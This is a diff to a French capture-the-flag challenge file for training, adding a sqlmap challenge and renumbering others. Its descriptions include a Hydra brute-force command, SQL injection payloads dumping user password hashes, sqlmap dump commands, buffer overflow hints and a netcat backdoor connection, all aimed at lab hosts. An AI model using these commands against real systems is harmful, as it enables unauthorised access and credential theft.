@@ -1,4 +1,4 @@
-{"count": 49, "results": [
+{"count": 50, "results": [
     {
         "category": "Ghost in the Shell",
         "state": "visible",
@@ -332,8 +332,8 @@
         "max_attempts": 0,
         "type": "standard",
         "id": 28,
-        "value": 2,
-        "description": "\nAu vu des besoins croissants, Jar Jar se voit contraint de migrer vers un progicel plus adapté. Il l'installe et part en week-end.</br>\n```\nhttps://{IP_SERVER}/password/index.php\n```\n</br>\nAu moment de se connecter, Jean réalise qu'il n'a aucune idée du login/password utilisé par Jar Jar. </br>\nIl va chercher sur internet des couples login/password par défaut connus sur le git https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/\n</br>\nIl ouvre <code>mysql-betterdefaultpasslist.txt</code> et il teste à la main...\n</br></br>\n__Note pour plus tard... Les constructeurs ont souvent leurs propres mots de passe par défaut. Une petite liste est dispo dans le fichier default-passwords.csv du même github. Utile quand on récupère un vieux routeur ou une instalaltion par défaut d'un serveur Tomcat...__"
+        "value": 10,
+        "description": "\nAu vu des besoins croissants, Jar Jar se voit contraint de migrer vers un progicel plus adapté. Il l'installe et part en week-end.</br>\n```\nhttps://{IP_SERVER}/password/index.php\n```\n</br>\nAu moment de se connecter, Jean réalise qu'il n'a aucune idée du login/password utilisé par Jar Jar. </br>\nIl va chercher sur internet des couples login/password par défaut connus sur le git https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/\n</br>\nIl ouvre <code>mysql-betterdefaultpasslist.txt</code> et il teste à la main...\n</br></br>\nNote pour plus tard... Les constructeurs ont souvent leurs propres mots de passe par défaut. Une petite liste est dispo dans le fichier default-passwords.csv du même github. Utile quand on récupère un vieux routeur ou une instalaltion par défaut d'un serveur Tomcat..."
     },
     {
         "category": "Password",
@@ -344,8 +344,8 @@
         "max_attempts": 0,
         "type": "standard",
         "id": 29,
-        "value": 2,
-        "description": "\nLe logiciel n'étant pas adapté, Jar Jar en installe un autre et part en vacances.\n```\nhttps://{IP_SERVER}/password/index_hydra.php\n```\n</br>\nAu moment de se connecter, Jean réalise qu'il n'a, cette fois encore, aucune idée du login/password utilisé par Jar Jar. </br>\nIl n'a pas envie de se taper une nouvelle liste à la main, et décide d'automatiser la saisie des mots de passe avec THC Hydra.</br></br>\n</br>\nIl fait un click droit sur la page d'authentification du site web et regarde le code HTML.\n</br>\nIl en déduit la méthode (get/post) d'envoie des données par la page web vers le serveur, et les nom des champs utilisés.</br>\n```\n<form action=\"\"  method=\"post\"> ==> Méthode POST\n<input type=\"text\" class=\"form-control\" id=\"login\" name=\"login\"> ==> champ login\n<input type=\"password\" class=\"form-control\" id=\"password\" name=\"password\"> ==> champ password\n```\n</br>\nIl lance une kali et récupère deux fichiers unix_users.txt et unix_passwords.txt qui sont rangés avec d'autres dictionnaires de mots de passe dans <code>/usr/share/wordlists/metasploit/</code>.\nIl commence à lire la description de THC-Hydra en [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra) pour savoir le configurer.</br></br>\n```\nhydra {IP_SERVER} \\\nhttps-form-post \\\n\"/password/index_hydra.php\\\n:login=^USER^&password=^PASS^\\\n:Authentification\"\\\n-L unix_users.txt -P unix_passwords.txt \\\n-I -vvvv -f\n```\n```\n{IP_SERVER}                  : notre serveur</br>\nhttps-form-post              : https et post</br>\n/password/index_hydra.php    : url à tester</br>\nlogin=^USER^&password=^PASS^ : les parametres à tester avec les fichiers Users et Passwords</br>\n-L unix_users.txt : fichier contenant la liste des logins</br>\n-P unix_passwords.txt : fichier contenant la liste des mots de passe</br>\nAuthentification : message présent sur la page en cas d'echec de l'authentification</br>\n-v : Verbose\n-f : Une fois un login/password trouvé arréter de chercher\n```\n</br></br>\nDans un CTF, les serveurs sont configurés pour limiter le débit des requètes et ne pas se retrouver à genoux sous les requètes massives des utilisateurs. </br>\nGénéralement, on n'aime pas le bruteforce.</br>\nSi le mot de passe ne sort pas très vite avec les listes par 'défaut', c'est que ce n'est pas la bonne méthode.</br>\nSur du ssh, le serveur va être configuré pour 2 tentatives par seconde max... Impec pour du manuel, pas terrible pour du brute force..."
+        "value": 15,
+        "description": "\nLe logiciel n'étant pas adapté, Jar Jar en installe un autre et part en vacances.\n```\nhttps://{IP_SERVER}/password/index_hydra.php\n```\n</br>\nAu moment de se connecter, Jean réalise qu'il n'a, cette fois encore, aucune idée du login/password utilisé par Jar Jar. </br>\nIl n'a pas envie de se taper une nouvelle liste à la main, et décide d'automatiser la saisie des mots de passe avec THC Hydra.</br></br>\n</br>\nIl fait un click droit sur la page d'authentification du site web et regarde le code HTML.\n</br>\nIl en déduit la méthode (get/post) d'envoie des données par la page web vers le serveur, et les nom des champs utilisés.</br>\n```\n<form action=\"\"  method=\"post\"> ==> Méthode POST\n<input type=\"text\" class=\"form-control\" id=\"login\" name=\"login\"> ==> champ login\n<input type=\"password\" class=\"form-control\" id=\"password\" name=\"password\"> ==> champ password\n```\n</br>\nIl lance une kali et récupère deux fichiers unix_users.txt et unix_passwords.txt qui sont rangés avec d'autres dictionnaires de mots de passe dans <code>/usr/share/wordlists/metasploit/</code>.\nIl commence à lire la description de THC-Hydra en [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra) pour savoir le configurer.</br></br>\n```\nhydra {IP_SERVER} \\\nhttps-form-post \\\n\"/password/index_hydra.php\\\n:login=^USER^&password=^PASS^\\\n:Authentification\"\\\n-L unix_users.txt -P unix_passwords.txt \\\n-I -vvvv -f\n```\n```\n{IP_SERVER}                  : notre serveur</br>\nhttps-form-post              : https et post</br>\n/password/index_hydra.php    : url à tester</br>\nlogin=^USER^&password=^PASS^ : les parametres à tester avec les fichiers Users et Passwords</br>\n-L unix_users.txt            : fichier contenant la liste des logins</br>\n-P unix_passwords.txt        : fichier contenant la liste des mots de passe</br>\nAuthentification             : message présent sur la page en cas d'echec de l'authentification</br>\n-v                           : Verbose\n-f                           : Une fois un login/password trouvé arréter de chercher\n```\n</br></br>\nDans un CTF, les serveurs sont configurés pour limiter le débit des requètes et ne pas se retrouver à genoux sous la charge. </br>\nGénéralement, on n'aime pas le bruteforce.</br>\nSi le mot de passe ne sort pas très vite avec les listes par 'défaut', c'est que ce n'est pas la bonne méthode.</br>\nSur du ssh, le serveur va souvent être configuré pour 2 tentatives par seconde max... Impec pour du manuel, pas terrible pour du brute force..."
     },
     {
         "category": "SQLi",
@@ -384,6 +384,18 @@
         "description": "\nContinue sur la même url. Cette fois, en plus de noms des users, on va récupérer le hash de leurs password...</br></br>\nRemplace le paramètre 673489 par :\n```\n673489 UNION select concat(login,\" \",passwd) from users\n```\nTu vas générer la requète :\n```\nSELECT msg FROM messages WHERE idmsg= 673489 UNION select concat(login,\" \",passwd) from users\n```\nQui va concaténer la liste des users et leur hash de leur password à la fin de la liste des messages."
     },
     {
+        "category": "SQLi",
+        "state": "visible",
+        "requirements": "null",
+        "name": "Sans les mains...",
+        "docker": "",
+        "max_attempts": 0,
+        "type": "standard",
+        "id": 33,
+        "value": 10,
+        "description": "\nA partir du moment ou nous avons un champ utisable, il est possible de récupérer TOUTE la base de donnée. </br>\nCa peut se faire à la main, ou sans les mains avec sqlmap : [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)\nA partir du terminal, le serveur se nomme : ctf-sqli, et est accessible en http.\n```\nsqlmap -u http://ctf-sqli/getmsg.php?idmsg=673489 --tables\nDatabase: dbmccoy\n[3 tables]\n+---------------------------------------+\n| messages                              |\n| users                                 |\n| bonus                                 |\n+---------------------------------------+\nDatabase: information_schema\n[59 tables]\n+---------------------------------------+\n| CHARACTER_SETS                        |\n| COLLATIONS                            |\n| COLLATION_CHARACTER_SET_APPLICABILITY |\n| COLUMNS                               |\n```\n</br>\nNous récupèrons non seulement les tables de notre base `dbmccoy`, mais en plus toute la structure de mysql.\n</br>\n```\nsqlmap -u http://ctf-sqli/getmsg.php?idmsg=673489 -D dbmccoy -T bonus --dump\n```\n</br>\nRegardons le contenu de la table bonus..."
+    },
+    {
         "category": "Buffer overflows",
         "state": "visible",
         "requirements": "null",
@@ -391,7 +403,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 33,
+        "id": 34,
         "value": 10,
         "description": "\n```\nssh bender@IPSERVER\nmdp: leelu\n```\nLe programme say_hello vient de remporter le concours de l'IA la plus futée du MIT. Malheureusement ses concepteurs se sont concentrés sur les performances du CPU et un peu négligé la sécurité.</br>\nJette un oeil a son source: buffer_01.c </br>\n```\n$ ./say_hello bob\n```\nRemplace bob par 12345678901234567890.\nCa dépasse des 10 caractères alloués au tableau name.\nEt ça va écraser le tableau intro[10]=\"Hello\";\nSi nous continuons, nous pouvons écraser la variable tst, et forcer un appel à print_flag();"
     },
@@ -403,7 +415,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 34,
+        "id": 35,
         "value": 15,
         "description": "\n```\nssh leela@IPSERVER\nmdp: yivo\n```\nLes programmeurs ont sorti une version 2 de leur IA, avec une sécurité renforcée.\nJette un oeil a son source: buffer_02.c </br>\nIl faut forcer la valeur de tst à 'Z' pour déclencher un appel à print_flag();"
     },
@@ -415,7 +427,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 35,
+        "id": 36,
         "value": 20,
         "description": "\n```\nssh philip@IPSERVER\nmdp: elzar\n```\nAlertés par la communauté, et sous la pression des investisseurs qui détestent le bad nuzz, les programmeurs ont sorti une version 3 de leur IA, toujours plus sécure.\nJette un oeil a son source: buffer_03.c </br>\nIl faut forcer la valeur de tst à 'SecCheck' pour déclencher un appel à print_flag();"
     },
@@ -427,7 +439,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 36,
+        "id": 37,
         "value": 5,
         "description": "\nLes ordinateurs codent leurs informations sur des octets qui peuvent prendre une valeur entre 0 et 255.</br>\nUn octet est composé de 8 bits, chacun valant 0 ou 1, que l'on peut grouper deux fois 4 bits.</br>\n0000 0000 vaut 0</br>\n0000 0001 vaut 1</br>\n0000 0010 vaut 2</br>\n0000 0011 vaut 3</br>\n1111 1111 vaut 255.</br>\nLe système hexadécimal est basé 4 bits et permet de compter jusqu'à 16 : 0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F</br>\n0 = 0  = 0000</br>\nA = 10 = 1010</br>\nB = 11 = 1011</br>\nF = 15 = 1111</br>\nLa notation hexadécimale, telle 0x1F, est souvent utilisée pour donner la valeur 'brutes' d'un octet.</br>\n0x00 = 0</br>\n0x01 = 1</br>\n0xFF = 255</br>\nLe flag est la valeur de 0x1F."
     },
@@ -439,7 +451,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 37,
+        "id": 38,
         "value": 5,
         "description": "\nLes ordinateurs codent leurs informations, sur des octets.</br>\nUn octet peut prendre une valeur entre 0 et 255.</br>\nLe code ascii standardise l'utilisation de ces valeurs.</br>\n```\nhttps://fr.wikipedia.org/wiki/American_Standard_Code_for_Information_Interchange#/media/File:ASCII-Table-wide.svg\n```\nCertaines valeurs permettent d'afficher du texte, d'autres de déplacer le curseur à l'écran...</br>\nLe flag est constitué de quatre lettres dont les codes ascii sont : 89 111 108 111</br>"
     },
@@ -451,7 +463,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 38,
+        "id": 39,
         "value": 5,
         "description": "\nUn fichier binaire utilise les 255 valeurs des octets.</br>\nUn fichier texte n'utilise que la sous partie texte du code ascii.\nL'encodage base64 permet de coder un fichier binaire en n'utilisant que cette sous partie texte.\nLe flag est l'encodage en base64 du bloc ABCD(_#hj:-893d\n```\nprintf 'tralala' | base64\nhttp://www.utilities-online.info/base64/\n```"
     },
@@ -463,7 +475,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 39,
+        "id": 40,
         "value": 5,
         "description": "\nLe flag est le decodage de ZmxhZ191bl9zNGNyM3RfZDNjMGQzdXI=\nLe = à la fin n'est pas systématique, mais est caractéristique de l'encodage base64.\n```\nprintf 'dHJhbGFsYQo=' | base64 -d\nhttp://www.utilities-online.info/base64/\n```"
     },
@@ -475,7 +487,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 40,
+        "id": 41,
         "value": 5,
         "description": "\nLe flag est le decodage de iodj_Oh_frgh_Fdhvdu_f_hvw_gh_od_edooh\nCe code est un code Caesar. On décale les lettres d'un nombre fixe. Ici +3.\nf->i   l->o\nLe site dcode.fr vous permet de voir d'un coup d'oeil toutes les combinaisons.\n```\nhttps://www.dcode.fr/caesar-cipher\n```"
     },
@@ -487,7 +499,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 41,
+        "id": 42,
         "value": 5,
         "description": "\nLe flag est le decodage de ntio_Tm_kwlm_Kimaiz_k_mab_nikqtm_i_kiaamz\n```\nhttps://www.dcode.fr/caesar-cipher\n```"
     },
@@ -499,7 +511,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 42,
+        "id": 43,
         "value": 5,
         "description": "\nLe flag est le decodage de hefi_Ej_ehig_Onixsgkj_e_xxv_fngnc\nCe code est un code Vigenere. On décale les lettres d'un nombre egal aux lettres d'une clef. Ici CTF.\nf+C->E   l+T->e  a+F->f ...\n```\nhttps://www.dcode.fr/vigenere-cipher\n```\nPensez à remettre le flag au format flag_xx_x_xxx"
     },
@@ -511,7 +523,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 43,
+        "id": 44,
         "value": 5,
         "description": "\nLe flag est le decodage de hefi_c_y_cb_hclxg_wz_phwf_tz_uni\nPour casser le code il faut des informations: longueur de la clef, langue utilisée ou mot décodé.\nIci on peut supposer que FLAG est un mot du message décodé.\n```\nhttps://www.dcode.fr/vigenere-cipher\n```\nPensez à remettre le flag au format flag_xx_x_xxx"
     },
@@ -523,7 +535,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 44,
+        "id": 45,
         "value": 5,
         "description": "\n```\nhttps://bentrobotlabs.wordpress.com/2018/08/26/weak-rsa-challenge/\n```"
     },
@@ -535,7 +547,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 45,
+        "id": 46,
         "value": 10,
         "description": "\nAvant tout, télécharge le fichier flag01_enc.bin sur ton Kali.\n```\ncat flag01_enc.bin\n```\nEt oui, c est du binaire illisible.</br></br>\n```\nhttp://IPSERVER:9090/index.htm\n```\nOuvre cette URL dans un autre onglet pour obtenir un serveur. </br>\nPuis connecte toi au serveur en ssh, avec le user 'user1' et le mot de passe 'password'.</br>\nLe programme dechiffre_01 va te déchiffrer le fichier flag01_enc.bin une fois transféré sur le serveur.</br>\n```\ncat flag01_enc.bin | base64\n```\nSur ton kali, encode flag01_enc.bin en base64. L'encodage base64 permet de transférer des fichier binaires en mode texte.</br></br>\n```\necho \\\"RXQgb3VpLCDDp2EgbWFyY2hlCg===\\\"| base64 --decode > flag01_enc\n```\nFais ensuite un copier/coller de la chaine base64 générée qui ressemble à RXQgb3VpLCDDp2EgbWFyY2hlCg== dans ton shell sur le serveur.\nDécode avec base64 --decode, et sauve dans le fichier flag01_enc.</br></br>\n```\ndechiffre_01 flag01_enc flag01.txt\n```\nUtilise dechiffre_01 pour déchiffrer le flag encodé et le sauver dans flag01.txt"
     },
@@ -547,7 +559,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 46,
+        "id": 47,
         "value": 10,
         "description": "\nAvant tout, télécharge le fichier dechiffre_02 sur ton Kali.</br>\n```\nls -al dechiffre_02\n```\nIl fait 8k, c est un peu gros cette fois pour un copier/coller...</br></br>\n```\nhttp://IPSERVER:9090/index.htm\n```\nOuvre cette URL dans un autre onglet pour obtenir un serveur. </br>\nPuis connecte toi au serveur en ssh, avec le user 'user2' et le mot de passe 'password'.</br></br>\n```\nscp -P 2224 dechiffre_02 user2@IPSERVER:dechiffre02\n```\nTu as un accès ssh, utilise le mode de transfert de fichier de ssh.\nQuels sont les droits de ton binaire après le transfert ?"
     },
@@ -559,7 +571,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 47,
+        "id": 48,
         "value": 10,
         "description": "\nAvant tout, télécharge le fichier dechiffre_03 sur ton Kali.</br>\n```\npython -m SimpleHTTPServer 8080\n```\nDans le même répertoire que ce fichier, lance un serveur web avec une ligne de python.</br>\nTon Kali dispose maintenant d un serveur web prêt à transférer les fichiers localisés dans le même répertoire.</br></br>\n```\nifconfig\n```\nRecupère l adresse IP de ton Kali.</br></br>\n```\nhttp://IPSERVER:9090/index.htm\n```\nOuvre cette URL dans un autre onglet pour obtenir un serveur. </br>\nPuis connecte toi au serveur en ssh, avec le user 'user3' et le mot de passe 'password'.</br></br>\n```\nwget http://[IP de ton Kali]:8080/dechiffre_03\n```\nRécupère le fichier en utilisant une requête HTTP."
     },
@@ -571,7 +583,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 48,
+        "id": 49,
         "value": 5,
         "description": "\nLe serveur ftp qui tourne sur {IPSERVER} a été laissé en configuration par défaut.\nIl donne son nom et sa version à chaque connection.</br>\nPour le vérifier, connecte toi avec un netcat sur le port 21\n```\nnc IPSERVEUR port\n```\nDéconnecte toi en tapant `quit`.\nLe flag est la version du serveur sous le format x.x.x"
     },
@@ -583,7 +595,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 49,
+        "id": 50,
         "value": 40,
         "description": "\nPour activer la backdoor, connecte-toi avec un nom d'utilisateur se terminant par un smiley :)</br>\nTon shell va se geler.</br>\nUne backdoor est ouverte sur le port 6200 en tcp. Utilise un netcat pour y accéder..."
     }
